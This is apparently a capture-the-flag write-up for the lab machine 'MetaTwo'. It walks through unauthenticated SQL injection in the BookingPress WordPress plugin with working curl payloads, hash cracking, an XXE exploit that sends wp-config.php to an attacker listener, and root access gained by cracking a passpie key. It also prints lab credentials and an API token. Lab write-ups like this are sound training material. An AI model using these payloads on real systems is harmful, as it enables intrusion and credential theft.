>[!tldr] MetaTwo is an easy Linux machine that features a website running Wordpress, which is using a plugin vulnerable to unauthenticated SQL injection ( #CVE-2022-0739 ). It can be exploited to reveal the password hash of the Wordpress users which can be cracked to obtain the password for the Wordpress user `manager`. The Wordpress version in use is vulnerable to an XXE Vulnerability in the Media Library ( #CVE-2021-29447 ), which can be exploited to obtain credentials for the FTP server. A file on the FTP server reveals the SSH credentials for user `jnelson`. For privilege escalation, the `passpie` utility on the remote host can be exploited to obtain the password for the `root` user.


# Guided Mode
---
1. `How many TCP ports are open on the remote host?`
```shell
nmap -sT -F 10.129.228.95 --stats-every=5s
<SNIP>
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
- **Note**: Normally I would use `-p-` for all ports, however after 17 minutes i decided to use `-F` for top 100 ports
- Flag #1 -> `1`

---
2. `Which CMS and version is the website using?`
	1. First, I had to add the IP for `/etc/hosts` to be resolved
		1. `10.129.228.95 -> metapress.htb`
	2. Second, I opened up the site and see that `Wordpress` is being used, but no version. So instead I check developer tools to see the version!
- Flag #2 -> `Wordpress 5.6.2`

---
3. `Which PHP version is the website using?`
	1. Using `burpsuite` you can find in a response to the website a header indicating the PHP version
		1. `X-Powered-By: PHP/8.0.24`
- Flag #3 -> `8.0.24`

---
4. `Which CVE is the bookingpress plugin being used on the website vulnerable to?`
	1. We decided to use `wpscan` in order to scan for vulnerabilities
		1. `wpscan --url http://metapress.htb/ --enumerate --api-token 1YaO9sPVB5VOoG5OTQ1dDOe2P7Ax669AaU6YGFTz8Tg`
	2. The results are great, we learn the version of "bookingpress" is "v1.0.10"
```shell
 | [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection
 |     UUID: 388cd42d-b61a-42a4-8604-99b812db2357
 |     Fixed in: 1.0.11
 |     References:
 |      - https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739
 |      - https://plugins.trac.wordpress.org/changeset/2684789
```
- Flag #4 -> `CVE-2022-0739`

---
5. `Which database table contains the password hash for the Wordpress users?`
	1. Since we are dealing with a database table I looked towards FTP
		- No anonymous login
	2. Instead, we know SQLi works, so we can use the "search" feature in order to enumerate for this vulnerability.
		- No useful output
	3. According to `CVE-2022-0739` we can use the following for unatuhed SQLi
		1. In the "events" page `source code` we find a variable we need
			- `action:'bookingpress_generate_spam_captcha', _wpnonce:'2bfc8de11a'`
			
		2. CVE Documentation
			- `Create a new "category" and associate it with a new "service" via the BookingPress admin menu (/wp-admin/admin.php?page=bookingpress_services)`
			- `Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step Wizard Form")`
			- `Visit the just created page as an unauthenticated user and extract the "nonce" (view source -> search for "action:'bookingpress_front_get_category_services'")`
				- "wpnonce" = `2bfc8de11a` 
			- `Invoke the following curl command`
```shell

curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=2bfc8de11a&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

NOTE: The output looks like json data so you can pipe (|) jq to the end.

curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=2bfc8de11a&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' | jq .

<SNIP>
	"bookingpress_service_id": "admin",
    "bookingpress_category_id": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.",
<SNIP>
	"bookingpress_service_id": "manager",
    "bookingpress_category_id": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70"
<SNIP>
```
- The first command works and retrieves information
	- The second command is modified with "user_login", "user_pass" and to pull from `wp_users` database table
- Flag #5 -> `wp_users`

---
6. `What is the password for the Wordpress user manager?`
	1. After getting the category IDs, I noticed that they both start with `$P$`. 
		- According to `Hashcat` identify that is a "phpass, WordPress (MD5), Joomla (MD5)" hash with a hashcat-mode of `400`
	2. We now know the mode, so lets use `Hashcat` to get the password
		1. `hashcat -a 0 -m 400 '$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70' ~/Downloads/rockyou.txt` ->  `partylikearockstar`
- Flag #6 -> `partylikearockstar`
	
	- `manager`:`partylikearockstar`

---
7. `Which CVE is the Media library of this Wordpress version vulnerable to?`
	1. I went back to `wpscan` and searched for "Media Library" and found

```shell
| [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
 |     UUID: cbbe6c17-b24e-4be4-8937-c78472a138b5
 |     Fixed in: 5.6.3
 |     References:
 |      - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447 # HERE!
 
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/29378
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh
 |      - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/
 |      - https://hackerone.com/reports/1095645
 |      - https://www.youtube.com/watch?v=3NBxcmqCgt4
```
- As we can see from the "mitre" link we are given a exact CVE
- Flag #7 -> `CVE-2021-29447`

---
8. `What is the FTP password for the user metapress.htb?`
	1. First, I figured out how `CVE-2021-29447` works, i decided to use a [premade script](https://github.com/0xRar/CVE-2021-29447-PoC)
		1. `sudo python3 PoC.py -l <host> -p <port> -f <file>` -> Setup your machine as a listener
			- `-f` determines what will be returned, i.e. `/etc/passwd`
			- This will also generate the payload "`payload.wav`"
		2. Manually upload `payload.wav` to `metapress.htb/wp-admin/media-new.php`. You will than capture the file you specificed in the first command
```shell
[Tue Aug 18 13:17:25 2026] 10.129.228.95:48102 [200]: GET /evil.dtd
[Tue Aug 18 13:17:25 2026] 10.129.228.95:48102 Closing
[Tue Aug 18 13:17:26 2026] 10.129.228.95:48104 Accepted
[Tue Aug 18 13:17:26 2026] 10.129.228.95:48104 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
```
- This capture is in base64, you can decode in terminal or using **CyberChef**.
	- As expected the contents are from `/etc/passwd`
	
	2. Now, the hint tells us to use "wp_config.php" however, the file is actually `../wp-config.php`. So our command would look like
		1. `sudo python3 PoC.py -l <ATTACKER_IP> -p 1337 -f ../wp-config.php`
		2. Copy the base64 and decode
```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```
- We now know the login for `ftp.metapress.htb` 
	- `metapress.htb`:`9NYS_ii@FyL_p5M2NvJ`
- Flag #8 -> `9NYS_ii@FyL_p5M2NvJ`

---
9. `What is the SSH password for the user jnelson on the remote host?`
	1. Let's check the FTP server with our new credentials
		1. `metapress.htb`:`9NYS_ii@FyL_p5M2NvJ`
		2. In "mailer/send_email.php" we get the following:
```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
$mail->SMTPSecure = "tls";
$mail->Port = 587;

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");
```
- We get some new credentials for `jnelson`
	- `jnelson@metapress.htb`:`Cb4_JmWM8zUZWMu@Ys`
- Flag #9 -> `Cb4_JmWM8zUZWMu@Ys`

---
10. `Submit the flag located in the jnelson user's home directory.`

```shell
> ssh jnelson@10.129.228.95

jnelson@meta2:~$ ls -la
<SNIP>
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r----- 1 root    jnelson   33 Aug 18 16:26 user.txt
<SNIP>

jnelson@meta2:~$ cat user.txt
[REDACTED_FLAG]
```
- User Flag -> `[REDACTED_FLAG]`

---
11. `Which password manager software is present on the remote host?`
	1. From the output before we know its ".passpie"
- Flag #11 -> `passpie`

---
12. `What is the passphrase for the Passpie password manager?`
	 - From inside ssh I run passpie, but most commands need a passphrase
```shell
jnelson@meta2:/$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛

jnelson@meta2:~$ cat .passpie/.keys
<SNIP>
-----BEGIN PGP PRIVATE KEY BLOCK-----
<SNIP>
-----END PGP PRIVATE KEY BLOCK-----
<SNIP>
```
- As we can see, within `.passpie/.keys` is a pgp file which is stored as the key or maybe passphrase for ."passpie".
	1. `scp jnelson@10.129.228.95:/home/jnelson/.passpie/.keys ./keys` -> Downloads the `key` file from `jnelson` -> My local machine
	2. `gpg2john keys > keys.hash` -> Convert the key into a hash
	3. `john --wordlist=~/Tools/SecLists-2026.1/Passwords/Leaked-Databases/rockyou.txt keys.hash` -> Decrypt to get `blink182`
- Flag #12 -> `blink182`

---
13. `What is the password for the user root on the remote host?`
	- Equipped with the passpie passphrase we can now export the passwords for `root` into plaintext
```shell
jnelson@meta2:~$ passpie export file
Passphrase:#blink182

jnelson@meta2:~$ cat file
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
```
- As we can see we get the credentials for `root`:`p7qfAZt4_A1xo_0x`
- Flag #13 -> `p7qfAZt4_A1xo_0x`

---
14. `Submit the flag located in root's home directory.`
	- Now we have to login as root and get the root flag!
```shell
jnelson@meta2:~$ su - root
Password:#p7qfAZt4_A1xo_0x

root@meta2:~# cat root.txt
[REDACTED_FLAG]
```
- Root Flag -> `[REDACTED_FLAG]`
